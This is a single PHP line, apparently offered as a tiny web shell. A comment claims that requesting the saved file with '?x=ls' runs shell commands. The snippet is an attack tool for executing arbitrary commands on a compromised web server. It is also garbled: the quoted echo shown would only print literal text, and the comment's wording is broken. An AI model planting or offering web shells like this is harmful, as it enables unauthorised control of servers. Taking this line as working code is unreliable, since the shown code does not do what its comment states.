<?='$_GET[x]'?> // run ass .php?x=ls
